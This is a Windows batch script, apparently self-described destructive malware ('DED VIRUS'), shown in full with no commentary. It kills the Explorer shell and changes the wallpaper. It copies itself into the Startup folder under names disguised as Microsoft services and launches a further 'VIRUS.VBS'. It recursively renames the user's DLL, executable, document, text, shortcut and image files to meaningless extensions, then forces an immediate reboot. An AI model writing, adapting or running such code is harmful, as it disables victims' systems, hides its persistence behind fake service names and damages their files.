@echo off
taskkill -f -im explorer.exe
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /f /t REG_SZ /d "C:\_BOOT\SKELETON.JPG"
start /min "C:\_BOOT\EXPLORERKILLSPAM.BAT"
copy %0 "C:\_Boot\DED.BAT"
cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "C:\_Boot\ded.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ded.bat"
copy "C:\_Boot\launchsm.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MS SERVICES.bat"
set SCRIPT="%TEMP%\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs"
echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
echo sLinkFile = "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft-Services.lnk" >> %SCRIPT%
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
echo oLink.TargetPath = "C:\_Boot\ded.bat" >> %SCRIPT%
echo oLink.WorkingDirectory = "C:\_Boot" >> %SCRIPT%
echo oLink.Save >> %SCRIPT%
cscript /nologo %SCRIPT%
cd %USERPROFILE%
start "C:\_BOOT\VIRUS.VBS"
forfiles /S /M *.dll /C "cmd /c rename @file @fname.CDDLL"
forfiles /S /M *.txt /C "cmd /c rename @file @fname.IDDTFMG"
forfiles /S /M *.docx /C "cmd /c rename @file @fname.IDKDFS"
forfiles /S /M *.exe /C "cmd /c rename @file @fname.CDCEXE"
forfiles /S /M *.lnk /C "cmd /c rename @file @fname.LJNHK"
forfiles /S /M *.png /C "cmd /c rename @file @fname.NUDE"
forfiles /S /M *.jpg /C "cmd /c rename @file @fname.NFT"
copy "C:\_BOOT\REMOVE DED VIRUS.LNK" "%USERPROFILE%\DESKTOP\REMOVE DED VIRUS.LNK"
rename "%USERPROFILE%\Desktop\REMOVE DED VIRUS.LJNHK" "%USERPROFILE%\Desktop\REMOVE DED VIRUS.LNK"
start "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft-Services.lnk"
shutdown -r -t 0